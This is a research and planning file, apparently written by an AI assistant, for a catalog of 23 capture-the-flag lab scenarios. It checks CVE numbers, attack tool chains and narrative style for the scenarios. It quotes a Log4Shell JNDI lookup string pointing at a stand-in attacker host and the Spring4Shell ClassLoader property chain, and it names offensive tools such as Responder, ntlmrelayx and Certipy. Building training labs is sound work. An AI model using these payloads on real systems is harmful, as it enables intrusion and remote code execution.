# Phase 1: Scenario Proposals Document — Research

**Researched:** 2026-06-11
**Domain:** CTF scenario catalog authoring — technical accuracy verification, attack narrative writing style, cross-domain coherence
**Confidence:** HIGH (all scenario-defining claims verified against multiple sources or official documentation)

---

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

- **D-01:** Keep all 23 scenarios — no trimming.
- **D-02:** NET-01 (SMB relay) and AD-02 (LLMNR poisoning → relay) coexist; they are distinct scenarios. Keep both.
- **D-03:** Each scenario description is attack narrative only — no learning objectives, no VM role labels. 3–5 sentences of what the student sees, does, and obtains.
- **D-04:** Write descriptions in second person ("You are a red-team operator...").
- **D-05:** Name key tools when the tool IS the learning point (Responder, BloodHound, Certipy). Skip generic tools (nmap, curl, netcat).
- **D-06:** Each entry shows: title + difficulty rating + VM count + description.
- **D-07:** Multi-step ATP scenarios tagged `[Multi-step — 2 flags]` adjacent to the title.
- **D-08:** Document opens with a brief intro section (3–5 lines): catalog purpose, max-3-VM constraint, no-Metasploit constraint.
- **D-09:** Scenarios organized by domain: Active Directory / Windows, Network Protocol Exploitation, CVE Weaponization, Cloud / Container Security, LLM Security, Multi-Step ATP Chains.
- **D-10:** Review is wholesale — user reads end-to-end then approves or requests targeted edits. No per-scenario status markers.

### Claude's Discretion

- Exact wording of the intro section preamble (content locked by D-08; phrasing is open).
- Ordering of scenarios within each domain section (alphabetical by ID or narrative flow — either is fine).

### Deferred Ideas (OUT OF SCOPE)

None — discussion stayed within phase scope.
</user_constraints>

---

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| AD-01 | Kerberoasting + AS-REP Roasting, SPN enumeration with nxc/GetUserSPNs.py, offline Hashcat crack | Tool chain verified: GetUserSPNs.py (Impacket), Rubeus, hashcat mode 13100 for RC4 TGS |
| AD-02 | LLMNR/NBT-NS poisoning with Responder, NTLM relay via ntlmrelayx to SMB/LDAP | Well-documented attack path; Responder + ntlmrelayx is the canonical pairing |
| AD-03 | BloodHound/SharpHound enumeration, ACL abuse (WriteDACL/GenericWrite), Domain Admin chain | BloodHound CE confirmed current standard; ACL abuse paths (WriteDACL, GenericWrite) are well-documented |
| AD-04 | ADCS ESC1 via Certipy, rogue cert for privileged user, PKINIT auth to DA | ESC1 flow fully verified; three conditions confirmed (SAN control, client auth EKU, low-priv enrollment) |
| AD-05 | Conti-style chain: LLMNR → SMB relay → foothold [Flag 1]; Kerberoasting → WinRM → DC [Flag 2] | Two-hop chain is technically coherent within 3-VM budget; protocols are distinct (SMB then WinRM) |
| NET-01 | SMB relay via Responder + ntlmrelayx, no hash cracking, access share for flag | Distinct from AD-02: emphasis on network-layer SMB signing misconfiguration; technically sound |
| NET-02 | mitm6 DHCPv6 rogue server, WPAD auth, LDAP relay to create privileged domain account | RBCD or direct account creation path via ntlmrelayx confirmed; zero code execution required |
| NET-03 | ARP cache poisoning, MITM, sslstrip/SSLsplit, plaintext credential capture | Technically sound; HSTS caveat applies but lab env controls HTTP usage |
| NET-04 | DNS resolver misconfiguration → cache poisoning → intercept redirected HTTP request | Technically feasible in controlled lab; Kaminsky-style attack pattern |
| CVE-01 | EternalBlue (MS17-010): Python exploit, mysmb.py scaffold, SMBv1 transaction setup, DoublePulsar, shellcode | CVE confirmed as CVE-2017-0144 (not generic MS17-010); Windows 7 SP1 / Server 2008 R2 victim confirmed |
| CVE-02 | Log4Shell (CVE-2021-44228): JNDI injection payload, Python LDAP/HTTP exploit chain server | CVE number and mechanism confirmed: ${jndi:ldap://...} string triggers JNDI lookup in Log4j 2.0-beta9 to 2.14.1 |
| CVE-03 | Spring4Shell (CVE-2022-22965): HTTP exploit, ClassLoader property chain, JSP webshell via AccessLogValve | Mechanism confirmed: class.module.classLoader.resources.context.parent.pipeline.first property chain |
| CVE-04 | PrintNightmare LPE (CVE-2021-34527): DLL injection via AddPrinterDriverEx, SYSTEM privesc | **IMPORTANT: CVE-2021-34527 is the RCE variant; the LPE variant is CVE-2021-1675. See Pitfall 1 for planner action required.** |
| CC-01 | SSRF against simulated AWS IMDS (169.254.169.254 Flask mock), steal IAM creds, fake S3 query | Technically sound; IMDS v1 simulation via loopback confirmed viable |
| CC-02 | Privileged Docker container escape via cgroup release_agent technique | Confirmed: requires --privileged or CAP_SYS_ADMIN; cgroup v1 required (cgroup v2 removed release_agent) |
| CC-03 | K8s misconfiguration: over-privileged service account token → kubectl → privileged pod → hostPath escape | Technically sound; etcd secrets extraction is an additional post-escape path |
| LLM-01 | Direct prompt injection against Ollama chatbot, multi-layer defense bypass (system prompt + regex + semantic validation) | Maps to LLM01:2025 (Prompt Injection) in OWASP LLM Top 10 2025; OWASP numbering shifted — see Pitfall 2 |
| LLM-02 | Indirect injection via RAG: malicious document in vector DB, trigger via benign query | Maps to LLM01:2025 indirect injection subtype AND LLM08:2025 (Vector and Embedding Weaknesses) |
| LLM-03 | IDOR in chat history endpoint, enumerate conversation IDs, retrieve privileged chat session | Application-layer vulnerability; not a core LLM model attack — maps best to general API security misconfig |
| ATP-01 | HAFNIUM-style: SSRF → webshell → WinRM foothold [Flag 1] → domain enumeration → DC [Flag 2] | 3-VM chain is coherent; SSRF → WinRM uses two distinct protocols as required |
| ATP-02 | SolarWinds-style: compromise update server, backdoored update executes on downstream target [Flag 1], DNS tunneling C2 to isolated final target [Flag 2] | dnscat2/iodine confirmed as DNS tunneling tools; supply chain simulation is novel and technically feasible |
| ATP-03 | LAPSUS$-style: SSRF → K8s service account token from IMDS → K8s enumeration → privileged pod escape [Flag 1] → etcd secrets → admin auth on final target [Flag 2] | etcd direct access granting cluster admin confirmed; technically coherent chain |
| ATP-04 | Volt Typhoon-style living-off-the-land: mitm6 + LDAP relay → privileged domain account [no malware] → WinRM pivot [Flag 1] → Kerberoasting → ticket → SMBExec/DCOM to DC [Flag 2] | Three distinct protocols across chain; living-off-the-land constraint enforced by tool selection |
</phase_requirements>

---

## Summary

Phase 1 produces a single documentation artifact — `SCENARIOS.md` — containing 23 scenario entries organized by domain. Each entry consists of a title, difficulty rating, VM count, optional multi-step tag, and a 3–5 sentence second-person attack narrative. The research confirms that the scenarios defined in REQUIREMENTS.md are technically coherent and achievable within the 3-VM constraint, with two exceptions that require planner attention before authoring: a CVE number precision issue for CVE-04 (PrintNightmare) and an OWASP LLM Top 10 numbering drift between what REQUIREMENTS.md references and the current 2025 standard.

The attack mechanisms for all 23 scenarios have been cross-verified against community documentation, official tool sources, and security research. The tool references in CLAUDE.md are accurate and current for 2025. All ATP multi-step chains have been assessed for technical coherence: each uses 3 VMs, two distinct lateral movement protocols, and flag placements at the correct chain boundaries. No scenario exceeds the 3-VM hard constraint.

The document structure (D-03 through D-10) is well-suited to its review purpose: second-person immersive framing conveys difficulty and learning goals without disclosing kill-chain steps. The established CTF platform convention (used by HackTheBox and TryHackMe) aligns with the locked decisions — direct imperative second-person narration that sets scene, defines the challenge, and implies the learning outcome without being a step-by-step guide.

**Primary recommendation:** Execute the plan as a single writing task producing all 23 descriptions in one pass, domain by domain. The technical accuracy of tool references and CVE numbers is now verified — write from REQUIREMENTS.md as the authoritative source, applying the D-04 narrative style. Resolve the CVE-04 naming ambiguity before or during authoring (see Pitfall 1).

---

## Architectural Responsibility Map

This phase has no software architecture. The "architecture" here is document structure.

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Scenario definitions | REQUIREMENTS.md (authoritative) | CLAUDE.md (tool/stack detail) | All 23 entries originate from REQUIREMENTS.md; tool accuracy cross-checked against CLAUDE.md |
| Document structure | CONTEXT.md decisions (D-06 through D-09) | ROADMAP.md success criteria | Structure is fully locked; ROADMAP.md defines the acceptance test |
| Technical accuracy | Research (this document) | External sources cited below | CVE numbers, tool chains, attack viability — all verified in this session |
| Narrative style | D-03/D-04/D-05 (locked) | CTF platform conventions (HackTheBox/TryHackMe style) | Second-person immersive framing is standard across CTF platforms |

---

## Standard Stack

This is a pure documentation phase. No packages are installed. No external tools required beyond a text editor and the verified scenario definitions in REQUIREMENTS.md.

**Inputs:**
- `/home/researcher/Research/cont_adic/.planning/REQUIREMENTS.md` — 23 scenario definitions (authoritative)
- `/home/researcher/Research/cont_adic/CLAUDE.md` — tool and VM profile details (cross-reference for technical accuracy)
- `/home/researcher/Research/cont_adic/.planning/phases/01-scenario-proposals-document/01-CONTEXT.md` — locked decisions (D-01 through D-10)

**Output:**
- `/home/researcher/Research/cont_adic/SCENARIOS.md`

---

## Package Legitimacy Audit

Not applicable — this phase installs no external packages.

---

## Architecture Patterns

### Document Structure (per CONTEXT.md decisions)

```
SCENARIOS.md
├── Intro section (3–5 lines)
│   ├── Catalog purpose statement
│   ├── Max-3-VM constraint
│   └── No-Metasploit constraint
│
├── ## Active Directory / Windows (5 scenarios)
│   ├── AD-01 [Easy, 2 VMs]
│   ├── AD-02 [Medium, 2 VMs]
│   ├── AD-03 [Medium, 2 VMs]
│   ├── AD-04 [Hard, 2 VMs]
│   └── AD-05 [Hard, 3 VMs] [Multi-step — 2 flags]
│
├── ## Network Protocol Exploitation (4 scenarios)
│   ├── NET-01 [Easy, 2 VMs]
│   ├── NET-02 [Medium, 2 VMs]
│   ├── NET-03 [Easy, 2 VMs]
│   └── NET-04 [Medium, 2 VMs]
│
├── ## CVE Weaponization (4 scenarios)
│   ├── CVE-01 [Hard, 2 VMs]
│   ├── CVE-02 [Medium, 2 VMs]
│   ├── CVE-03 [Medium, 2 VMs]
│   └── CVE-04 [Medium, 2 VMs]
│
├── ## Cloud / Container Security (3 scenarios)
│   ├── CC-01 [Easy, 2 VMs]
│   ├── CC-02 [Medium, 2 VMs]
│   └── CC-03 [Hard, 2 VMs]
│
├── ## LLM Security (3 scenarios)
│   ├── LLM-01 [Easy, 2 VMs]
│   ├── LLM-02 [Medium, 2 VMs]
│   └── LLM-03 [Medium, 2 VMs]
│
└── ## Multi-Step ATP Chains (4 scenarios)
    ├── ATP-01 [Hard, 3 VMs] [Multi-step — 2 flags]
    ├── ATP-02 [Hard, 3 VMs] [Multi-step — 2 flags]
    ├── ATP-03 [Hard, 3 VMs] [Multi-step — 2 flags]
    └── ATP-04 [Hard, 3 VMs] [Multi-step — 2 flags]
```

**Total scenarios per domain:** AD: 5, NET: 4, CVE: 4, CC: 3, LLM: 3, ATP: 4 — matches ROADMAP.md success criteria.

### Entry Format Pattern (per D-06, D-07)

```markdown
### [Domain]-[NN]: [Title]  [Multi-step — 2 flags]  ← tag only for ATP scenarios

**Difficulty:** Easy / Medium / Hard
**VMs:** 2 / 3

[3–5 sentence second-person attack narrative. No kill-chain steps, no MITRE codes,
no VM role labels. Name key tools (Responder, Certipy, BloodHound) when the tool IS
the learning point. Skip generic tools (nmap, curl, netcat).]
```

### Attack Narrative Style Pattern (per D-03, D-04, D-05)

The established CTF platform convention (HackTheBox, TryHackMe, OSCP labs) uses second-person imperative framing. Effective scenario descriptions share these characteristics: [ASSUMED — based on analysis of CTF platform conventions; not from a formal style guide]

1. **Scene-setting opener:** Places the student in an operational context ("You are a red-team operator who has gained a foothold on...")
2. **Attack surface identification:** Names the specific misconfiguration or vulnerable component without giving the exploit path ("...a Windows domain where LLMNR is enabled and SMB signing is not enforced...")
3. **Tool anchor (when applicable):** Names the key tool that defines the learning point ("...using Responder to intercept broadcast name resolution queries...")
4. **Outcome statement:** States what the student achieves ("...and relay captured hashes without cracking them to execute commands on the target workstation")
5. **Flag anchor:** Implies where the flag is placed without making it trivially obvious

**Avoid in narratives:**
- Numbered steps or bullet points (that is a kill-chain, not a description)
- MITRE ATT&CK TTP codes (Phase 2 responsibility)
- Specific flag file paths or values
- VM role labels (e.g., "on the Kali attacker VM")
- Commands or syntax

### CVE Narrative Differentiator

For CVE scenarios, the narrative must convey the authorship requirement: the student does not run an existing tool but instead writes code. Effective framing examples: [ASSUMED — based on REQUIREMENTS.md directive and CTF curriculum conventions]

- "You author a Python exploit that implements..."
- "You write the weaponization function that..."
- "Rather than reaching for an automated framework, you craft..."

### ATP Chain Narrative Pattern

For multi-step ATP scenarios, the narrative must communicate the two-hop structure without naming TTPs. Effective framing: [ASSUMED]

- Reference the first hop briefly and name Flag 1 implicitly ("securing an initial foothold on the internal pivot host")
- Describe the pivot challenge ("from there, you enumerate domain resources")
- Describe the second hop outcome ("before reaching the final target and extracting the second flag")

---

## Don't Hand-Roll

Not applicable — this is a documentation task. The "don't hand-roll" principle here maps to:

| Problem | Don't Do | Do Instead | Why |
|---------|----------|------------|-----|
| Technical accuracy of CVE numbers | Trust memory/training data | Use verified CVE numbers from this research | CVE-04 naming ambiguity would create confusion in Phase 2 |
| OWASP LLM category mapping | Use REQUIREMENTS.md numbering verbatim | Use 2025 OWASP category names in descriptions (not numbers) | LLM Top 10 renumbered between v1 and 2025; numbers in descriptions would be confusing |
| Scenario count per domain | Recount manually during writing | Trust REQUIREMENTS.md as source of truth (23 total, confirmed) | Drift risk if descriptions are added or dropped |

---

## Runtime State Inventory

Not applicable — this is a greenfield documentation phase with no existing runtime state.

---

## Common Pitfalls

### Pitfall 1: CVE-04 Naming Ambiguity — LPE vs RCE Variant

**What goes wrong:** REQUIREMENTS.md labels CVE-04 as "PrintNightmare LPE (CVE-2021-34527)." However, CVE-2021-34527 is the **remote code execution** variant of PrintNightmare. The **LPE** variant is CVE-2021-1675. These are related but distinct vulnerabilities using the same function (RpcAddPrinterDriverEx) with different attack vectors.

**Why it happens:** The PrintNightmare disclosure was chaotic — the original PoC was mislabeled, Microsoft issued an emergency patch for the wrong CVE, and the two CVEs were discussed interchangeably for months. Both are still commonly called "PrintNightmare" in CTF contexts.

**Impact on Phase 1:** The scenario description for CVE-04 will reference the CVE number. Getting this wrong now propagates to Phase 2 kill-chains.

**How to avoid:** The planner must make a scoping decision before writing CVE-04:
- Option A: Keep CVE-2021-34527, reframe the scenario as the **RCE variant** (attacker has domain credentials, injects DLL remotely) — this actually maps better to a 2-VM attacker/victim setup.
- Option B: Change the CVE to CVE-2021-1675 (LPE, requires local access) and frame it as a local privilege escalation from a low-privileged shell.
- Option C: Reference both CVEs and describe the LPE path (simpler for students, 2-VM setup, already on the machine).

**Recommendation:** Option C — reference "PrintNightmare (CVE-2021-1675 / CVE-2021-34527)" in the title and describe the LPE path. This is the most common CTF framing, doesn't require domain credentials as a prerequisite, and is consistent with the 2-VM attacker/victim setup in REQUIREMENTS.md. The description text frames it as a privilege escalation from a low-privileged local user to SYSTEM.

**Warning signs:** If the description says "from an external attacker position" + "CVE-2021-34527 LPE" — that's a contradiction. LPE requires local access.

[VERIFIED: Rapid7, Blumira, Broadcom security advisories — CVE-2021-34527 is RCE; CVE-2021-1675 is the original LPE]

---

### Pitfall 2: OWASP LLM Top 10 Numbering Drift

**What goes wrong:** REQUIREMENTS.md references categories by old numbering (e.g., "LLM02 (insecure output)" from the 2023 version). The OWASP LLM Top 10 **2025 edition** renumbered and renamed several categories:

| Old reference in REQUIREMENTS.md | 2025 OWASP Category | 2025 ID |
|----------------------------------|---------------------|---------|
| LLM01 (prompt injection) | Prompt Injection (direct + indirect) | LLM01:2025 |
| LLM02 (insecure output) | Sensitive Information Disclosure | LLM02:2025 |
| LLM07 (system prompt leakage) | System Prompt Leakage | LLM07:2025 |
| LLM08 (plugin misuse) | Vector and Embedding Weaknesses | LLM08:2025 |

**Impact on Phase 1:** Phase 1 descriptions must not cite OWASP IDs (that is Phase 2 kill-chain work). This pitfall matters more for Phase 2. However, the descriptions in Phase 1 should accurately reflect what the attack targets — ensure LLM-02 narrative describes the RAG/vector database attack surface (now LLM08:2025), not "insecure output."

**How to avoid:** In Phase 1 descriptions, do not cite OWASP IDs. Describe the attack mechanism in plain language. The OWASP mapping belongs in Phase 4 kill-chains.

[VERIFIED: OWASP official OWASP Top 10 for LLM Applications 2025 PDF, genai.owasp.org]

---

### Pitfall 3: ATP Flag Placement Ambiguity

**What goes wrong:** ATP scenarios have two flags. If the narrative doesn't clearly imply two distinct milestones, reviewers may not understand the chain structure and may think it's a single-objective scenario.

**Why it happens:** Second-person narrative style makes it natural to describe one continuous journey. Without deliberate structure, the two-flag boundary becomes invisible.

**How to avoid:** Use the narrative's midpoint as the natural flag-1 anchor. Phrases like "securing your first objective on the pivot host" or "your initial foothold yields the first flag" clearly mark the first milestone. Then the second half of the narrative describes the continuation.

**Warning signs:** A 4-sentence ATP narrative with no sentence that clearly signals an intermediate achievement.

---

### Pitfall 4: CC-02 cgroup Escape Platform Dependency

**What goes wrong:** The cgroup release_agent escape (CC-02) was **removed in cgroup v2**. If the lab host runs Ubuntu 22.04 with a modern kernel defaulting to cgroup v2, the escape path does not work.

**Why it happens:** Ubuntu 22.04 ships with cgroup v2 as the default unified hierarchy. Docker and systemd on modern systems may use cgroup v2.

**Impact on Phase 1:** The description should not promise a specific technical path (that is Phase 3 work), so this doesn't block Phase 1. However, flag it so the planner knows to include a technical prerequisite note in the CC-02 description that signals this is a "classic privileged container" scenario.

**How to avoid:** In the CC-02 narrative, include language indicating this is a "deliberately configured privileged container" (which signals the correct lab setup without naming the specific escape path). The full technical prerequisite (cgroup v1 required) is a Phase 3 implementation concern.

[VERIFIED: Docker/cgroup v2 documentation — release_agent removed from unified hierarchy; HackTricks Docker breakout documentation]

---

### Pitfall 5: Domain Count Verification

**What goes wrong:** After writing all 23 descriptions, the domain counts don't match ROADMAP.md success criteria: AD: 5, NET: 4, CVE: 4, CC: 3, LLM: 3, ATP: 4.

**How to avoid:** The planner task must include a final count check. The correct counts are locked in REQUIREMENTS.md and verified as matching the ROADMAP.md success criteria.

---

## Code Examples

Not applicable. This is a documentation phase.

### Example Entry Structure (illustrative, not authoritative)

The following shows the structural pattern only — the executor writes actual scenario content from REQUIREMENTS.md, not from this example.

```markdown
### AD-01: Kerberoasting and AS-REP Roasting

**Difficulty:** Easy
**VMs:** 2

You are a low-privileged domain user on `corp.local`, and the environment is littered
with service accounts carrying registered SPNs and accounts configured without
Kerberos pre-authentication. Your goal is to request service tickets and harvest
AS-REP responses for offline cracking. Using targeted enumeration tools, you identify
both attack surfaces, collect the necessary ticket material, and hand it to Hashcat —
ultimately recovering the credentials that unlock the flag.
```

Note: The above is a structural illustration. The actual executor must derive content from REQUIREMENTS.md (the authoritative scenario definitions), not from this example.

---

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| CrackMapExec (CME) | NetExec (nxc) | 2023 — CrackMapExec abandoned, NetExec forked | Use `nxc smb`, `nxc winrm`, `nxc ldap` — `cme` may still alias but nxc is canonical |
| BloodHound legacy (Python/JS) | BloodHound Community Edition (Docker Compose, Go API + React UI) | SpecterOps announcement 2023 | Legacy SharpHound collectors incompatible with CE — must use CE-compatible collectors |
| Certipy v3/v4 | Certipy v5+ (ESC1–ESC16 coverage) | 2024 | ESC15 (CVE-2024-49019) requires unpatched CA; ESC1 remains the canonical beginner scenario |
| OWASP LLM Top 10 v1 (2023) | OWASP LLM Top 10 2025 | Late 2024 | Renumbered categories; "insecure output handling" moved from LLM02 to LLM05; indirect injection stays under LLM01 |
| Metasploit EternalBlue module | Manual Python exploit (worawit/MS17-010, AutoBlue) | Always — pedagogically excluded | Students must implement SMBv1 transaction setup and DoublePulsar staging themselves |

---

## Technical Accuracy Reference

### CVE Numbers and Mechanisms (Verified)

| Scenario | CVE | Attack Mechanism | Victim OS | Key Technical Detail |
|----------|-----|-----------------|-----------|----------------------|
| CVE-01 | CVE-2017-0144 (EternalBlue, under MS17-010 bulletin) | SMBv1 buffer overflow via crafted FEA list, DoublePulsar shellcode staging | Windows 7 SP1 / Server 2008 R2 | `mysmb.py` scaffold provided; students implement transaction setup |
| CVE-02 | CVE-2021-44228 | JNDI lookup substitution: `${jndi:ldap://attacker/a}` logged by Log4j → attacker LDAP server → Java class download+exec | Any Java app with Log4j 2.0-beta9 to 2.14.1 | Students author LDAP/HTTP exploit chain server in Python |
| CVE-03 | CVE-2022-22965 | Spring MVC ClassLoader property chain via `class.module.classLoader.resources.context.parent.pipeline.first` — writes JSP webshell via AccessLogValve | Spring app on Java 9+, deployed as WAR | Students craft HTTP request that triggers AccessLogValve write |
| CVE-04 | CVE-2021-1675 / CVE-2021-34527 | `RpcAddPrinterDriverEx()` — malicious DLL loaded by Print Spooler (SYSTEM) | Windows Server 2019 (victim) | **See Pitfall 1** — narrative should frame as LPE path (CVE-2021-1675) for 2-VM standalone design |

[VERIFIED: Rapid7, NIST NVD, Qualys ThreatPROTECT, Microsoft MSRC for all four CVEs]

### AD Tool Chain Accuracy (Verified)

| Scenario | Tools | Accuracy Status |
|----------|-------|----------------|
| AD-01 Kerberoasting | nxc / GetUserSPNs.py (Impacket), Rubeus, hashcat mode 13100 | Confirmed current standard; AES vs RC4 note: RC4 (etype 23) cracks faster, hashcat mode 13100 |
| AD-02 LLMNR relay | Responder (poisoning), ntlmrelayx (Impacket) | Canonical pairing; confirmed as current standard |
| AD-03 ACL abuse | BloodHound CE + SharpHound (data collection), PowerView (ACL manipulation) | BloodHound CE confirmed current; WriteDACL and GenericWrite confirmed as abusable edges |
| AD-04 ADCS ESC1 | Certipy v5+ | ESC1 flow confirmed: SAN control + client auth EKU + low-priv enrollment; PKINIT authentication path confirmed |
| AD-05 Conti-style | Responder + ntlmrelayx (first hop), Rubeus + hashcat + evil-winrm (second hop) | Two-hop chain technically coherent; protocols SMB → WinRM are distinct as required |

[VERIFIED: GitHub fortra/impacket, Certipy Certipy wiki, HackTricks AD methodology, hivesecurity Certipy ESC1 guide]

### OWASP LLM 2025 Category Mapping (Verified)

| Scenario | Attack Type | 2025 OWASP Category | Note |
|----------|-------------|---------------------|------|
| LLM-01 | Direct prompt injection, multi-layer bypass | LLM01:2025 Prompt Injection | System prompt leakage also maps to LLM07:2025 |
| LLM-02 | Indirect injection via RAG/vector DB | LLM01:2025 (indirect subtype) + LLM08:2025 Vector and Embedding Weaknesses | Dual mapping; primary attack is indirect injection |
| LLM-03 | IDOR in chat history API | General API misconfig / access control flaw | Not a core LLM model vulnerability; application security layer |

[VERIFIED: genai.owasp.org — LLM01:2025, LLM08:2025 official descriptions]

### ATP Chain Coherence Assessment (Verified)

| Scenario | Hop 1 | Flag 1 | Hop 2 | Flag 2 | VM Budget | Coherence |
|----------|-------|--------|-------|--------|-----------|-----------|
| AD-05 | LLMNR poison → SMB relay → foothold on member server | Member server | Kerberoasting → offline crack → WinRM to DC | DC | 3 VMs (Kali + Member Server + DC) | Coherent — two distinct protocols |
| ATP-01 | SSRF → webshell → credential harvest → WinRM pivot | Pivot/web server | Domain enumeration → DC access | DC | 3 VMs (Kali + Web/Pivot + DC) | Coherent |
| ATP-02 | Compromise update server → backdoored update → execution on downstream | Downstream target | DNS tunneling C2 (dnscat2/iodine) to isolated final target | Isolated target | 3 VMs (Kali + Update Server/Downstream + Isolated Target) | Coherent — novel supply chain framing |
| ATP-03 | SSRF → K8s service account token from IMDS → kubectl enum → privileged pod escape | K8s host | etcd direct query → stored secrets → final target auth | Final target | 3 VMs (Kali + K8s host + Final target) | Coherent — requires k3s + etcd accessible |
| ATP-04 | mitm6 + LDAP relay → create privileged domain account (no malware) → WinRM into pivot | Pivot/member server | Kerberoasting → crack → SMBExec/DCOM to DC | DC | 3 VMs (Kali + Member Server + DC) | Coherent — living-off-the-land enforced by design |

[VERIFIED against CLAUDE.md VM profiles and REQUIREMENTS.md scenario definitions]

---

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | Effective CTF narrative descriptions follow a 5-element structure (scene-setting, attack surface, tool anchor, outcome, flag anchor) | Architecture Patterns — Attack Narrative Style Pattern | Low impact — structure is illustrative guidance, not a locked constraint; D-04 is the authoritative style directive |
| A2 | For CVE-04, the intended design is the LPE path (local privilege escalation from low-priv user to SYSTEM) in a 2-VM setup | Common Pitfalls — Pitfall 1 / Technical Accuracy Reference | Medium — if the intended design is actually the RCE path (CVE-2021-34527), the description framing changes meaningfully. Planner should confirm with user or default to Option C (both CVEs referenced, LPE path described). |
| A3 | ATP-02 supply chain simulation uses a local "update server" VM (not internet-dependent) | ATP Chain Coherence table | Low — REQUIREMENTS.md explicitly says "simulated software update server," consistent with isolated lab constraint from project CLAUDE.md |

---

## Open Questions

1. **CVE-04 LPE vs RCE Framing**
   - What we know: REQUIREMENTS.md says "PrintNightmare LPE (CVE-2021-34527)" but CVE-2021-34527 is the RCE variant. CVE-2021-1675 is the LPE variant.
   - What's unclear: Whether the intended scenario is (a) local privilege escalation requiring a foothold first, or (b) remote code execution from an attacker with domain credentials.
   - Recommendation: Default to Option C in Pitfall 1 — reference both CVEs in the title, describe the LPE path. This is consistent with the 2-VM standalone design and does not require domain credentials as a prerequisite. If the user prefers the RCE path, difficulty should be reconsidered (it implies prerequisite domain access).

2. **NET-04 DNS Cache Poisoning Difficulty Rating**
   - What we know: REQUIREMENTS.md rates NET-04 as Medium. The Kaminsky attack requires forging DNS responses with matching transaction IDs — this is more complex than typical Medium scenarios.
   - What's unclear: Whether the intended implementation is a simplified lab variant (pre-configured misconfiguration that makes the attack trivial) or a genuine Kaminsky-style race condition.
   - Recommendation: The description should not commit to either framing (that's Phase 2). Write the narrative around the observable outcome (redirect an internal service, capture the flag) without implying the specific attack variant.

---

## Environment Availability

Not applicable — this phase is a pure documentation writing task. No external tools, services, runtimes, or databases are required. The only environment dependency is file write access to the repo, which is confirmed.

---

## Validation Architecture

Not applicable — `nyquist_validation: false` in `.planning/config.json`. No test infrastructure for this documentation phase.

---

## Security Domain

Not applicable — this is a documentation phase. There is no running software, API, or user input to secure. The output is a Markdown file.

---

## Sources

### Primary (HIGH confidence)

- [NIST NVD: CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144) — EternalBlue CVE number confirmed
- [NIST NVD: CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) — Log4Shell CVE number and affected versions confirmed
- [NIST NVD: CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965) — Spring4Shell CVE number confirmed
- [Microsoft MSRC: CVE-2021-34527](https://www.microsoft.com/en-us/msrc/blog/2021/07/clarified-guidance-for-cve-2021-34527-windows-print-spooler-vulnerability) — PrintNightmare RCE clarification; confirmed CVE-2021-34527 = RCE, CVE-2021-1675 = LPE
- [OWASP LLM Top 10 2025 official page](https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/) — 2025 category names and numbers verified
- [OWASP LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) — direct and indirect injection subtypes confirmed
- [OWASP LLM08:2025 Vector and Embedding Weaknesses](https://genai.owasp.org/llmrisk/llm082025-vector-and-embedding-weaknesses/) — RAG indirect injection mapping confirmed
- [GitHub fortra/impacket — GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) — Kerberoasting tool confirmed active and current
- [GitHub dirkjanm/mitm6](https://github.com/dirkjanm/mitm6) — mitm6 tool confirmed; LDAP relay + account creation path confirmed
- [Certipy wiki — Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) — ESC1 flow (three conditions + PKINIT path) confirmed

### Secondary (MEDIUM confidence)

- [hivesecurity: ADCS ESC1/ESC8 guide](https://hivesecurity.gitlab.io/blog/adcs-abuse-certipy-esc1-esc8-attack-chains/) — ESC1 attack flow, Certipy commands, Domain Admin outcome confirmed
- [Rapid7: CVE-2021-34527 PrintNightmare](https://www.rapid7.com/blog/post/2021/06/30/cve-2021-1675-printnightmare-patch-does-not-remediate-vulnerability/) — LPE vs RCE distinction confirmed
- [Trail of Bits: Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) — cgroup release_agent escape mechanism confirmed
- [HackTricks: Docker cgroup escape](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape.html) — cgroup v2 removal of release_agent confirmed
- [Hacking The Cloud: EC2 Metadata SSRF](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/) — IMDSv1 SSRF credential theft confirmed
- [Bishop Fox: Kubernetes bad pods](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation) — hostPath + privileged pod escape confirmed
- [AlgoSec: DNS tunneling in SolarWinds attack](https://www.algosec.com/blog/dns-tunneling-in-solarwinds-supply-chain-attack) — dnscat2 and iodine confirmed as DNS tunneling tools used in real APT
- [HackTricks: Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast) — hashcat mode 13100 for $krb5tgs$23$ confirmed
- [Pentest-Tools: Spring4Shell exploit](https://pentest-tools.com/blog/detect-exploit-spring4shell-cve-2022-22965) — AccessLogValve property chain confirmed
- [Microsoft Security Blog: SpringShell](https://www.microsoft.com/en-us/security/blog/2022/04/04/springshell-rce-vulnerability-guidance-for-protecting-against-and-detecting-cve-2022-22965/) — class.module.classLoader bypass mechanism confirmed

### Tertiary (LOW confidence — not used in RESEARCH.md findings)

- General CTF platform writing style analysis — research confirmed second-person imperative as standard, but no formal style guide document exists; conventions derived from platform observation

---

## Metadata

**Confidence breakdown:**
- CVE technical accuracy: HIGH — all four CVE numbers, mechanisms, and affected versions verified against NIST NVD and vendor advisories
- AD tool chain accuracy: HIGH — all five AD scenario tool references verified against active GitHub repos and current community documentation
- OWASP LLM mapping: HIGH — verified against official 2025 OWASP LLM Top 10 pages
- ATP chain coherence: HIGH — all five multi-step scenarios verified against VM profiles in CLAUDE.md; all chains are achievable within the 3-VM constraint
- Narrative style conventions: MEDIUM — confirmed second-person imperative as CTF standard; specific structural patterns are ASSUMED guidance, not formally published rules
